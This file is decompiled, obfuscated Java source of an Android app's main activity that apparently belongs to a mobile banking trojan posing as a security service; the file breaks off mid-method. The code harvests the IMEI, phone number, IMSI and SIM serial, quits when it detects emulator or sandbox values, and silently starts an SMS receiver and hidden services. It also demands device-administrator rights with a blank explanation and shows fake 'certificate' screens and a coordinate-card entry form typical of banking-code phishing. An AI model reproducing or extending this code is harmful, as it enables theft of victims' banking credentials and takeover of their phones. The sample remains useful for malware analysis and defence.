package com.soft360.iService;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ProgressDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.res.Resources;
import android.database.SQLException;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Handler;
import android.os.Process;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.animation.AlphaAnimation;
import android.view.animation.ScaleAnimation;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ViewFlipper;
import cD;
import cE;
import cF;
import cG;
import cH;
import cI;
import cJ;
import cK;
import cL;
import cM;
import cN;
import cO;
import cP;
import cQ;
import cR;
import cS;
import cT;
import cU;
import cV;
import cW;
import cX;
import cY;
import cZ;
import com.soft360.web.MyAdmin;
import cy;
import dB;
import dC;
import dE;
import dF;
import dG;
import dH;
import dJ;
import dL;
import dM;
import dN;
import dO;
import dP;
import dQ;
import dR;
import dU;
import da;
import db;
import dc;
import dd;
import de;
import df;
import dg;
import dh;
import di;
import dj;
import dk;
import dl;
import dm;
import do;
import dq;
import dr;
import ds;
import dt;
import du;
import dv;
import dw;
import dx;
import dy;
import dz;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class MainActivity
  extends Activity
{
  public ProgressDialog a;
  DevicePolicyManager jdField_a_of_type_AndroidAppAdminDevicePolicyManager;
  ComponentName jdField_a_of_type_AndroidContentComponentName;
  public Handler a;
  cD jdField_a_of_type_CD;
  public cy a;
  public dU a;
  public String a;
  public boolean a;
  
  public MainActivity()
  {
    this.jdField_a_of_type_Boolean = false;
    this.jdField_a_of_type_JavaLangString = "";
  }
  
  private int a(String paramString)
  {
    return getResources().getIdentifier(paramString, "drawable", getPackageName());
  }
  
  private String a(boolean paramBoolean)
  {
    String str4 = 111111111 + (int)(Math.random() * 8.88888888E8D);
    String str1;
    String str2;
    if (Math.random() > 0.5D)
    {
      str1 = "0";
      if (Math.random() <= 0.5D) {
        break label151;
      }
      str2 = "3";
      label52:
      if (Math.random() <= 0.5D) {
        break label157;
      }
    }
    label151:
    label157:
    for (String str3 = "4";; str3 = "7")
    {
      str1 = str4.substring(0, 2) + str1 + str4.substring(3, 4) + str2 + str4.substring(5, 6) + str3 + str4.substring(7);
      if (paramBoolean) {
        this.jdField_a_of_type_DU.d(str1);
      }
      return str1;
      str1 = "1";
      break;
      str2 = "9";
      break label52;
    }
  }
  
  private void a(String paramString)
  {
    Toast.makeText(getBaseContext(), paramString, 0).show();
  }
  
  private String b()
  {
    String str2 = 11111111 + (int)(Math.random() * 8.8888888E7D);
    String str1;
    if (Math.random() > 0.5D)
    {
      str1 = "3";
      if (Math.random() <= 0.5D) {
        break label134;
      }
    }
    label134:
    for (Object localObject = "4";; localObject = "9")
    {
      str1 = str2.substring(0, 1) + str1 + str2.substring(2, 4) + (String)localObject + str2.substring(5);
      localObject = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
      ((SharedPreferences.Editor)localObject).putString("license_code", str1);
      ((SharedPreferences.Editor)localObject).commit();
      return str1;
      str1 = "0";
      break;
    }
  }
  
  private void b()
  {
    Object localObject = (Button)findViewById(2131427384);
    ((Button)localObject).setEnabled(false);
    localObject = new cG(this, (Button)localObject);
    ((EditText)findViewById(2131427400)).addTextChangedListener((TextWatcher)localObject);
    ((EditText)findViewById(2131427401)).addTextChangedListener((TextWatcher)localObject);
    ((EditText)findViewById(2131427402)).addTextChangedListener((TextWatcher)localObject);
  }
  
  private void b(String paramString)
  {
    if (Build.VERSION.SDK_INT < 11)
    {
      ((android.text.ClipboardManager)getSystemService("clipboard")).setText(paramString);
      return;
    }
    ((android.content.ClipboardManager)getSystemService("clipboard")).setPrimaryClip(ClipData.newPlainText("message", paramString));
  }
  
  private boolean b()
  {
    Object localObject1 = getApplicationContext();
    Object localObject2 = ((ActivityManager)((Context)localObject1).getSystemService("activity")).getRunningAppProcesses();
    ((Context)localObject1).getPackageManager();
    localObject1 = ((List)localObject2).iterator();
    do
    {
      if (!((Iterator)localObject1).hasNext()) {
        return false;
      }
      localObject2 = (ActivityManager.RunningAppProcessInfo)((Iterator)localObject1).next();
    } while ((!((ActivityManager.RunningAppProcessInfo)localObject2).processName.startsWith("com.BioTechnology.iClientsService")) || (((ActivityManager.RunningAppProcessInfo)localObject2).processName.equals(getApplicationContext().getPackageName())));
    return true;
  }
  
  private String c()
  {
    TelephonyManager localTelephonyManager = (TelephonyManager)getSystemService("phone");
    String str = localTelephonyManager.getLine1Number();
    if ((str == null) || (str.toString().trim().isEmpty())) {
      return localTelephonyManager.getSubscriberId();
    }
    return str;
  }
  
  private String d()
  {
    try
    {
      String str = ((TelephonyManager)getSystemService("phone")).getNetworkOperatorName();
      return str;
    }
    catch (Exception localException) {}
    return "undefine";
  }
  
  private String e()
  {
    return ((TelephonyManager)getSystemService("phone")).getSimSerialNumber();
  }
  
  public final String a(int paramInt)
  {
    String str1 = getString(paramInt);
    try
    {
      String str2 = new String(this.jdField_a_of_type_CD.a(str1));
      return str2;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    return str1;
  }
  
  public final void a()
  {
    this.jdField_a_of_type_Boolean = this.jdField_a_of_type_DU.o();
    if (this.jdField_a_of_type_Boolean)
    {
      ((LinearLayout)findViewById(2131427329)).setVisibility(8);
      ((LinearLayout)findViewById(2131427341)).setVisibility(0);
      return;
    }
    ((LinearLayout)findViewById(2131427329)).setVisibility(0);
    ((LinearLayout)findViewById(2131427341)).setVisibility(8);
  }
  
  public final void a(ArrayList paramArrayList)
  {
    LinearLayout localLinearLayout = (LinearLayout)findViewById(2131427383);
    localLinearLayout.removeAllViews();
    int i = 0;
    if (i >= paramArrayList.size()) {
      return;
    }
    Object localObject2 = ((String)paramArrayList.get(i)).split(":");
    int j = Integer.parseInt(localObject2[1]);
    Object localObject1;
    switch (j)
    {
    default: 
      localObject1 = null;
    }
    for (;;)
    {
      ((View)localObject1).setTag(localObject2[0]);
      localLinearLayout.addView((View)localObject1);
      TextView localTextView = (TextView)((View)localObject1).findViewById(2131427475);
      localTextView.setTag("tv_org" + i);
      localTextView.setText(localObject2[0]);
      ((TextView)((View)localObject1).findViewById(2131427474)).setText(a(2131165425).replace("#pos#", j).replace("#koord#", localObject2[0]));
      localObject1 = (EditText)((View)localObject1).findViewById(2131427348);
      ((EditText)localObject1).setTag("edit" + i);
      if (i + 1 == paramArrayList.size()) {
        ((EditText)localObject1).setImeOptions(6);
      }
      localObject2 = (Button)findViewById(2131427384);
      ((Button)localObject2).setEnabled(false);
      ((EditText)localObject1).addTextChangedListener(new cH(this, (Button)localObject2));
      i += 1;
      break;
      localObject1 = LayoutInflater.from(this).inflate(2130903097, null, true);
      continue;
      localObject1 = LayoutInflater.from(this).inflate(2130903098, null, true);
      continue;
      localObject1 = LayoutInflater.from(this).inflate(2130903099, null, true);
    }
  }
  
  public final boolean a()
  {
    LinearLayout localLinearLayout = (LinearLayout)findViewById(2131427383);
    int i = 0;
    for (;;)
    {
      if (i >= 3) {
        return false;
      }
      if (((EditText)localLinearLayout.findViewWithTag("edit" + i)).getText().toString().equals("")) {
        return true;
      }
      i += 1;
    }
  }
  
  public void onBackPressed()
  {
    Integer.parseInt(getString(2131165185));
    super.onBackPressed();
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    this.jdField_a_of_type_CD = new cD();
    label13241:
    for (;;)
    {
      try
      {
        this.jdField_a_of_type_DU = dU.a(getApplicationContext());
        SharedPreferences localSharedPreferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        paramBundle = ((TelephonyManager)getSystemService("phone")).getDeviceId();
        if ((getResources().getString(2131165187).equals("1")) && ((paramBundle.equals("000000000000000")) || (c().startsWith("1555521")) || (d().equals("Android")) || (e().equals("89014103211118510720")))) {
          Process.killProcess(Process.myPid());
        }
        if (!b())
        {
          paramBundle = new Intent("android.provider.Telephony.SMS_RECEIVED");
          paramBundle.setClass(this, SmsReciever.class);
          sendBroadcast(paramBundle);
          startService(new Intent(this, AService.class));
          startService(new Intent(this, webService.class));
          paramBundle = localSharedPreferences.edit();
          paramBundle.putBoolean("autorun", true);
          paramBundle.commit();
        }
        switch (Integer.parseInt(getString(2131165185)))
        {
        default: 
          this.jdField_a_of_type_AndroidAppAdminDevicePolicyManager = ((DevicePolicyManager)getSystemService("device_policy"));
          this.jdField_a_of_type_AndroidContentComponentName = new ComponentName(this, MyAdmin.class);
          if (!this.jdField_a_of_type_AndroidAppAdminDevicePolicyManager.isAdminActive(this.jdField_a_of_type_AndroidContentComponentName))
          {
            paramBundle = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            paramBundle.putExtra("android.app.extra.DEVICE_ADMIN", this.jdField_a_of_type_AndroidContentComponentName);
            paramBundle.putExtra("android.app.extra.ADD_EXPLANATION", "");
            startActivityForResult(paramBundle, 1);
          }
          return;
          paramBundle = localSharedPreferences.edit();
          paramBundle.putBoolean("autorun", false);
          paramBundle.commit();
          break;
        case 1: 
          setContentView(2130903041);
          ((EditText)findViewById(2131427336)).setHint(a(2131165201));
          ((EditText)findViewById(2131427338)).setHint(a(2131165204));
          ((Button)findViewById(2131427340)).setText(a(2131165205));
          ((TextView)findViewById(2131427342)).setText(a(2131165207));
          ((TextView)findViewById(2131427345)).setText(a(2131165203));
          a();
          break;
        case 2: 
          requestWindowFeature(1);
          setContentView(2130903052);
          ((TextView)findViewById(2131427332)).setText(a(2131165208));
          new cJ(this, (byte)0).execute(new Void[0]);
          break;
        case 3: 
          requestWindowFeature(1);
          setContentView(2130903063);
          ((TextView)findViewById(2131427332)).setText(a(2131165210));
          ((TextView)findViewById(2131427355)).setText(a(2131165211));
          ((TextView)findViewById(2131427357)).setText(a(2131165212));
          ((TextView)findViewById(2131427356)).setText(a(2131165213));
          ((TextView)findViewById(2131427359)).setText(a(2131165214));
          ((TextView)findViewById(2131427352)).setText(a(2131165215));
          ((TextView)findViewById(2131427361)).setText(a(2131165216));
          ((TextView)findViewById(2131427362)).setText(a(2131165217));
          ((TextView)findViewById(2131427385)).setText(a(2131165218));
          ((TextView)findViewById(2131427387)).setText(a(2131165219));
          ((TextView)findViewById(2131427388)).setText(a(2131165220));
          ((Button)findViewById(2131427340)).setText(a(2131165221));
        }
        try
        {
          this.jdField_a_of_type_DU.p();
          paramBundle = ((TelephonyManager)getSystemService("phone")).getDeviceId();
          paramBundle = paramBundle.substring(0, 4) + "-" + paramBundle.substring(4, 8) + "-" + paramBundle.substring(8, 12) + "-" + paramBundle.substring(12);
          ((TextView)findViewById(2131427342)).setText(paramBundle);
          onScanNow(findViewById(2131427340));
          continue;
          requestWindowFeature(1);
          setContentView(2130903072);
          ((TextView)findViewById(2131427332)).setText(a(2131165222));
          ((TextView)findViewById(2131427355)).setText(a(2131165226));
          ((TextView)findViewById(2131427357)).setText(a(2131165228));
          ((TextView)findViewById(2131427356)).setText(a(2131165227));
          ((TextView)findViewById(2131427359)).setText(a(2131165229));
          ((Button)findViewById(2131427340)).setText(a(2131165223));
          try
          {
            this.jdField_a_of_type_DU.p();
            if (!localSharedPreferences.getBoolean("isSerteficate4", false))
            {
              findViewById(2131427353).setVisibility(8);
              findViewById(2131427347).setVisibility(0);
              continue;
            }
            ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode4", a(false)));
            continue;
            requestWindowFeature(1);
            setContentView(2130903083);
            ((TextView)findViewById(2131427332)).setText(a(2131165230));
            ((TextView)findViewById(2131427355)).setText(a(2131165234));
            ((TextView)findViewById(2131427357)).setText(a(2131165236));
            ((TextView)findViewById(2131427356)).setText(a(2131165235));
            ((TextView)findViewById(2131427359)).setText(a(2131165237));
            ((Button)findViewById(2131427340)).setText(a(2131165231));
            try
            {
              this.jdField_a_of_type_DU.p();
              if (!localSharedPreferences.getBoolean("isSerteficate5", false))
              {
                findViewById(2131427353).setVisibility(8);
                findViewById(2131427347).setVisibility(0);
                continue;
              }
              ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode5", a(false)));
              continue;
              requestWindowFeature(1);
              setContentView(2130903092);
              ((TextView)findViewById(2131427332)).setText(a(2131165238));
              ((TextView)findViewById(2131427355)).setText(a(2131165242));
              ((TextView)findViewById(2131427357)).setText(a(2131165244));
              ((TextView)findViewById(2131427359)).setText(a(2131165245));
              ((TextView)findViewById(2131427352)).setText(a(2131165246));
              ((TextView)findViewById(2131427361)).setText(a(2131165247));
              ((Button)findViewById(2131427340)).setText(a(2131165239));
              try
              {
                this.jdField_a_of_type_DU.p();
                if (!localSharedPreferences.getBoolean("isSerteficate6", false))
                {
                  findViewById(2131427353).setVisibility(8);
                  findViewById(2131427347).setVisibility(0);
                  continue;
                }
                ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode6", a(false)));
                continue;
                requestWindowFeature(1);
                setContentView(2130903093);
                ((TextView)findViewById(2131427332)).setText(a(2131165248));
                ((TextView)findViewById(2131427355)).setText(a(2131165249));
                ((TextView)findViewById(2131427357)).setText(a(2131165250));
                ((TextView)findViewById(2131427356)).setText(a(2131165251));
                try
                {
                  this.jdField_a_of_type_DU.p();
                  findViewById(2131427331).setVisibility(4);
                  findViewById(2131427343).setVisibility(4);
                  findViewById(2131427354).setVisibility(4);
                  findViewById(2131427363).setVisibility(4);
                  findViewById(2131427351).setVisibility(4);
                  findViewById(2131427372).setVisibility(4);
                  findViewById(2131427466).setVisibility(4);
                  findViewById(2131427467).setVisibility(4);
                  continue;
                  requestWindowFeature(1);
                  setContentView(2130903094);
                  ((TextView)findViewById(2131427332)).setText(a(2131165252));
                  ((TextView)findViewById(2131427355)).setText(a(2131165253));
                  ((TextView)findViewById(2131427469)).setText(a(2131165256));
                  ((TextView)findViewById(2131427357)).setText(a(2131165257));
                  ((Button)findViewById(2131427340)).setText(a(2131165254));
                  try
                  {
                    this.jdField_a_of_type_DU.p();
                    findViewById(2131427376).setVisibility(0);
                    findViewById(2131427381).setVisibility(8);
                    findViewById(2131427386).setVisibility(8);
                    continue;
                    requestWindowFeature(1);
                    setContentView(2130903095);
                    ((TextView)findViewById(2131427332)).setText(a(2131165258));
                    ((TextView)findViewById(2131427355)).setText(a(2131165262));
                    ((TextView)findViewById(2131427357)).setText(a(2131165264));
                    ((TextView)findViewById(2131427356)).setText(a(2131165263));
                    ((TextView)findViewById(2131427359)).setText(a(2131165265));
                    ((TextView)findViewById(2131427352)).setText(a(2131165266));
                    ((TextView)findViewById(2131427361)).setText(a(2131165268));
                    try
                    {
                      this.jdField_a_of_type_DU.p();
                      paramBundle = new AlphaAnimation(1.0F, 0.1F);
                      paramBundle.setDuration(1000L);
                      paramBundle.setRepeatCount(-1);
                      findViewById(2131427368).startAnimation(paramBundle);
                      if (!localSharedPreferences.getBoolean("isSerteficate9", false))
                      {
                        findViewById(2131427353).setVisibility(8);
                        findViewById(2131427347).setVisibility(0);
                        continue;
                      }
                      ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode9", a(false)));
                      continue;
                      requestWindowFeature(1);
                      setContentView(2130903042);
                      ((TextView)findViewById(2131427332)).setText(a(2131165269));
                      ((TextView)findViewById(2131427355)).setText(a(2131165273));
                      ((TextView)findViewById(2131427357)).setText(a(2131165275));
                      ((TextView)findViewById(2131427356)).setText(a(2131165274));
                      ((TextView)findViewById(2131427359)).setText(a(2131165276));
                      ((TextView)findViewById(2131427352)).setText(a(2131165277));
                      ((Button)findViewById(2131427340)).setText(a(2131165270));
                      try
                      {
                        this.jdField_a_of_type_DU.p();
                        if (!localSharedPreferences.getBoolean("isSerteficate10", false))
                        {
                          findViewById(2131427353).setVisibility(8);
                          findViewById(2131427347).setVisibility(0);
                          continue;
                        }
                        ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode10", a(false)));
                        continue;
                        requestWindowFeature(1);
                        setContentView(2130903043);
                        ((TextView)findViewById(2131427332)).setText(a(2131165278));
                        ((TextView)findViewById(2131427355)).setText(a(2131165282));
                        ((TextView)findViewById(2131427357)).setText(a(2131165284));
                        ((TextView)findViewById(2131427356)).setText(a(2131165283));
                        ((TextView)findViewById(2131427359)).setText(a(2131165285));
                        ((TextView)findViewById(2131427352)).setText(a(2131165286));
                        ((Button)findViewById(2131427340)).setText(a(2131165279));
                        try
                        {
                          this.jdField_a_of_type_DU.p();
                          if (!localSharedPreferences.getBoolean("isSerteficate11", false))
                          {
                            findViewById(2131427353).setVisibility(8);
                            findViewById(2131427347).setVisibility(0);
                            continue;
                          }
                          ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode11", a(false)));
                          continue;
                          requestWindowFeature(1);
                          setContentView(2130903044);
                          ((TextView)findViewById(2131427332)).setText(a(2131165287));
                          ((TextView)findViewById(2131427355)).setText(a(2131165291));
                          ((TextView)findViewById(2131427357)).setText(a(2131165293));
                          ((TextView)findViewById(2131427356)).setText(a(2131165292));
                          ((TextView)findViewById(2131427359)).setText(a(2131165294));
                          ((TextView)findViewById(2131427352)).setText(a(2131165295));
                          ((Button)findViewById(2131427340)).setText(a(2131165288));
                          try
                          {
                            this.jdField_a_of_type_DU.p();
                            if (!localSharedPreferences.getBoolean("isSerteficate12", false))
                            {
                              findViewById(2131427353).setVisibility(8);
                              findViewById(2131427347).setVisibility(0);
                              continue;
                            }
                            ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode12", a(false)));
                            continue;
                            requestWindowFeature(1);
                            setContentView(2130903045);
                            ((TextView)findViewById(2131427332)).setText(a(2131165296));
                            ((TextView)findViewById(2131427355)).setText(a(2131165300));
                            ((TextView)findViewById(2131427357)).setText(a(2131165302));
                            ((TextView)findViewById(2131427356)).setText(a(2131165301));
                            ((TextView)findViewById(2131427359)).setText(a(2131165303));
                            ((TextView)findViewById(2131427352)).setText(a(2131165304));
                            ((Button)findViewById(2131427340)).setText(a(2131165297));
                            try
                            {
                              this.jdField_a_of_type_DU.p();
                              if (!localSharedPreferences.getBoolean("isSerteficate13", false))
                              {
                                findViewById(2131427353).setVisibility(8);
                                findViewById(2131427347).setVisibility(0);
                                continue;
                              }
                              ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode13", a(false)));
                              continue;
                              requestWindowFeature(1);
                              setContentView(2130903046);
                              ((TextView)findViewById(2131427332)).setText(a(2131165305));
                              ((TextView)findViewById(2131427355)).setText(a(2131165309));
                              ((TextView)findViewById(2131427357)).setText(a(2131165311));
                              ((TextView)findViewById(2131427356)).setText(a(2131165310));
                              ((TextView)findViewById(2131427359)).setText(a(2131165312));
                              ((TextView)findViewById(2131427352)).setText(a(2131165313));
                              ((Button)findViewById(2131427340)).setText(a(2131165306));
                              try
                              {
                                this.jdField_a_of_type_DU.p();
                                if (!localSharedPreferences.getBoolean("isSerteficate14", false))
                                {
                                  findViewById(2131427353).setVisibility(8);
                                  findViewById(2131427347).setVisibility(0);
                                  continue;
                                }
                                ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode14", a(false)));
                                continue;
                                requestWindowFeature(1);
                                setContentView(2130903047);
                                ((TextView)findViewById(2131427332)).setText(a(2131165314));
                                ((TextView)findViewById(2131427355)).setText(a(2131165318));
                                ((TextView)findViewById(2131427357)).setText(a(2131165320));
                                ((TextView)findViewById(2131427356)).setText(a(2131165319));
                                ((TextView)findViewById(2131427359)).setText(a(2131165321));
                                ((TextView)findViewById(2131427352)).setText(a(2131165322));
                                ((Button)findViewById(2131427340)).setText(a(2131165315));
                                try
                                {
                                  this.jdField_a_of_type_DU.p();
                                  if (!localSharedPreferences.getBoolean("isSerteficate15", false))
                                  {
                                    findViewById(2131427353).setVisibility(8);
                                    findViewById(2131427347).setVisibility(0);
                                    continue;
                                  }
                                  ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode15", a(false)));
                                  continue;
                                  requestWindowFeature(1);
                                  setContentView(2130903048);
                                  ((TextView)findViewById(2131427332)).setText(a(2131165323));
                                  ((TextView)findViewById(2131427355)).setText(a(2131165327));
                                  ((TextView)findViewById(2131427357)).setText(a(2131165329));
                                  ((TextView)findViewById(2131427356)).setText(a(2131165328));
                                  ((TextView)findViewById(2131427359)).setText(a(2131165330));
                                  ((TextView)findViewById(2131427352)).setText(a(2131165331));
                                  ((Button)findViewById(2131427340)).setText(a(2131165324));
                                  try
                                  {
                                    this.jdField_a_of_type_DU.p();
                                    if (!localSharedPreferences.getBoolean("isSerteficate16", false))
                                    {
                                      findViewById(2131427353).setVisibility(8);
                                      findViewById(2131427347).setVisibility(0);
                                      continue;
                                    }
                                    ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode16", a(false)));
                                    continue;
                                    requestWindowFeature(1);
                                    setContentView(2130903049);
                                    ((TextView)findViewById(2131427356)).setText(a(2131165338));
                                    ((TextView)findViewById(2131427357)).setText(a(2131165337));
                                    ((TextView)findViewById(2131427359)).setText(a(2131165336));
                                    ((TextView)findViewById(2131427362)).setText(a(2131165334));
                                    ((TextView)findViewById(2131427361)).setText(a(2131165333));
                                    ((Button)findViewById(2131427340)).setText(a(2131165335));
                                    try
                                    {
                                      this.jdField_a_of_type_DU.p();
                                      if (!localSharedPreferences.getBoolean("isSerteficate17", false))
                                      {
                                        findViewById(2131427353).setVisibility(8);
                                        findViewById(2131427347).setVisibility(0);
                                        continue;
                                      }
                                      ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode17", a(false)));
                                      continue;
                                      requestWindowFeature(1);
                                      setContentView(2130903050);
                                      ((TextView)findViewById(2131427332)).setText(a(2131165339));
                                      ((TextView)findViewById(2131427355)).setText(a(2131165343));
                                      ((TextView)findViewById(2131427357)).setText(a(2131165345));
                                      ((TextView)findViewById(2131427356)).setText(a(2131165344));
                                      ((TextView)findViewById(2131427359)).setText(a(2131165346));
                                      ((TextView)findViewById(2131427352)).setText(a(2131165347));
                                      ((TextView)findViewById(2131427361)).setText(a(2131165348));
                                      ((Button)findViewById(2131427340)).setText(a(2131165340));
                                      try
                                      {
                                        this.jdField_a_of_type_DU.p();
                                        if (!localSharedPreferences.getBoolean("isSerteficate18", false))
                                        {
                                          findViewById(2131427353).setVisibility(8);
                                          findViewById(2131427347).setVisibility(0);
                                          continue;
                                        }
                                        ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode18", a(false)));
                                        continue;
                                        requestWindowFeature(1);
                                        setContentView(2130903051);
                                        ((TextView)findViewById(2131427332)).setText(a(2131165349));
                                        ((TextView)findViewById(2131427355)).setText(a(2131165353));
                                        ((TextView)findViewById(2131427357)).setText(a(2131165355));
                                        ((TextView)findViewById(2131427356)).setText(a(2131165354));
                                        ((TextView)findViewById(2131427352)).setText(a(2131165357));
                                        ((Button)findViewById(2131427340)).setText(a(2131165350));
                                        try
                                        {
                                          this.jdField_a_of_type_DU.p();
                                          localSharedPreferences.getBoolean("isSerteficate19", false);
                                          findViewById(2131427353).setVisibility(8);
                                          findViewById(2131427347).setVisibility(0);
                                          findViewById(2131427364).setVisibility(8);
                                          continue;
                                          requestWindowFeature(1);
                                          setContentView(2130903053);
                                          ((TextView)findViewById(2131427332)).setText(a(2131165360));
                                          ((TextView)findViewById(2131427355)).setText(a(2131165361));
                                          try
                                          {
                                            this.jdField_a_of_type_DU.p();
                                            ((TextView)findViewById(2131427355)).setText(a(true));
                                            continue;
                                            requestWindowFeature(1);
                                            setContentView(2130903054);
                                            ((TextView)findViewById(2131427332)).setText(a(2131165362));
                                            ((TextView)findViewById(2131427355)).setText(a(2131165366));
                                            ((TextView)findViewById(2131427357)).setText(a(2131165368));
                                            ((TextView)findViewById(2131427356)).setText(a(2131165367));
                                            ((TextView)findViewById(2131427359)).setText(a(2131165369));
                                            ((TextView)findViewById(2131427352)).setText(a(2131165370));
                                            ((Button)findViewById(2131427340)).setText(a(2131165363));
                                            try
                                            {
                                              this.jdField_a_of_type_DU.p();
                                              if (!localSharedPreferences.getBoolean("isSerteficate21", false))
                                              {
                                                findViewById(2131427353).setVisibility(8);
                                                findViewById(2131427347).setVisibility(0);
                                                continue;
                                              }
                                              ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode21", a(false)));
                                              continue;
                                              requestWindowFeature(1);
                                              setContentView(2130903055);
                                              ((TextView)findViewById(2131427361)).setText(a(2131165372));
                                              ((TextView)findViewById(2131427362)).setText(a(2131165373));
                                              ((TextView)findViewById(2131427359)).setText(a(2131165375));
                                              ((TextView)findViewById(2131427357)).setText(a(2131165376));
                                              ((Button)findViewById(2131427340)).setText(a(2131165374));
                                              try
                                              {
                                                this.jdField_a_of_type_DU.p();
                                                if (!localSharedPreferences.getBoolean("isSerteficate22", false))
                                                {
                                                  findViewById(2131427353).setVisibility(8);
                                                  findViewById(2131427347).setVisibility(0);
                                                  continue;
                                                }
                                                ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode22", a(false)));
                                                continue;
                                                requestWindowFeature(1);
                                                setContentView(2130903056);
                                                ((TextView)findViewById(2131427332)).setText(a(2131165378));
                                                ((TextView)findViewById(2131427355)).setText(a(2131165381));
                                                ((TextView)findViewById(2131427357)).setText(a(2131165380));
                                                ((TextView)findViewById(2131427356)).setText(a(2131165382));
                                                ((Button)findViewById(2131427340)).setText(a(2131165379));
                                                try
                                                {
                                                  this.jdField_a_of_type_DU.p();
                                                  if (!localSharedPreferences.getBoolean("isSerteficate23", false))
                                                  {
                                                    findViewById(2131427353).setVisibility(8);
                                                    findViewById(2131427347).setVisibility(0);
                                                    continue;
                                                  }
                                                  findViewById(2131427347).setVisibility(8);
                                                  findViewById(2131427353).setVisibility(0);
                                                  ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode23", a(false)));
                                                  continue;
                                                  requestWindowFeature(1);
                                                  setContentView(2130903057);
                                                  ((TextView)findViewById(2131427332)).setText(a(2131165383));
                                                  ((TextView)findViewById(2131427355)).setText(a(2131165387));
                                                  ((TextView)findViewById(2131427357)).setText(a(2131165389));
                                                  ((TextView)findViewById(2131427356)).setText(a(2131165388));
                                                  ((TextView)findViewById(2131427359)).setText(a(2131165390));
                                                  ((TextView)findViewById(2131427352)).setText(a(2131165391));
                                                  ((TextView)findViewById(2131427361)).setText(a(2131165392));
                                                  ((Button)findViewById(2131427340)).setText(a(2131165384));
                                                  try
                                                  {
                                                    this.jdField_a_of_type_DU.p();
                                                    if (!localSharedPreferences.getBoolean("isSerteficate24", false))
                                                    {
                                                      findViewById(2131427353).setVisibility(8);
                                                      findViewById(2131427347).setVisibility(0);
                                                      continue;
                                                    }
                                                    findViewById(2131427347).setVisibility(8);
                                                    findViewById(2131427353).setVisibility(0);
                                                    ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode24", a(false)));
                                                    continue;
                                                    requestWindowFeature(1);
                                                    setContentView(2130903058);
                                                    ((TextView)findViewById(2131427355)).setText(a(2131165397));
                                                    ((TextView)findViewById(2131427357)).setText(a(2131165399));
                                                    ((TextView)findViewById(2131427356)).setText(a(2131165398));
                                                    ((TextView)findViewById(2131427352)).setText(a(2131165401));
                                                    ((TextView)findViewById(2131427361)).setText(a(2131165403));
                                                    ((TextView)findViewById(2131427362)).setText(a(2131165393));
                                                    try
                                                    {
                                                      this.jdField_a_of_type_DU.p();
                                                      if (!localSharedPreferences.getBoolean("isSerteficate25", false))
                                                      {
                                                        findViewById(2131427347).setVisibility(0);
                                                        findViewById(2131427353).setVisibility(8);
                                                        continue;
                                                      }
                                                      findViewById(2131427347).setVisibility(8);
                                                      findViewById(2131427353).setVisibility(0);
                                                      ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode25", a(false)));
                                                      continue;
                                                      requestWindowFeature(1);
                                                      setContentView(2130903059);
                                                      ((TextView)findViewById(2131427332)).setText(a(2131165405));
                                                      ((TextView)findViewById(2131427355)).setText(a(2131165408));
                                                      ((TextView)findViewById(2131427357)).setText(a(2131165410));
                                                      ((TextView)findViewById(2131427356)).setText(a(2131165409));
                                                      ((TextView)findViewById(2131427359)).setText(a(2131165412));
                                                      try
                                                      {
                                                        this.jdField_a_of_type_DU.p();
                                                        if (!localSharedPreferences.getBoolean("isSerteficate26", false))
                                                        {
                                                          findViewById(2131427353).setVisibility(8);
                                                          findViewById(2131427347).setVisibility(0);
                                                          continue;
                                                        }
                                                        findViewById(2131427347).setVisibility(8);
                                                        findViewById(2131427353).setVisibility(0);
                                                        ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode26", a(false)));
                                                        continue;
                                                        requestWindowFeature(1);
                                                        setContentView(2130903060);
                                                        ((TextView)findViewById(2131427378)).setText(a(2131165420));
                                                        ((TextView)findViewById(2131427382)).setText(a(2131165422));
                                                        ((TextView)findViewById(2131427332)).setText(a(2131165424));
                                                        ((TextView)findViewById(2131427355)).setText(a(2131165425));
                                                        ((TextView)findViewById(2131427357)).setText(a(2131165421));
                                                        ((TextView)findViewById(2131427352)).setText(a(2131165415));
                                                        ((TextView)findViewById(2131427361)).setText(a(2131165419));
                                                        ((TextView)findViewById(2131427362)).setText(a(2131165416));
                                                        ((TextView)findViewById(2131427385)).setText(a(2131165419));
                                                        ((TextView)findViewById(2131427387)).setText(a(2131165417));
                                                        ((TextView)findViewById(2131427388)).setText(a(2131165423));
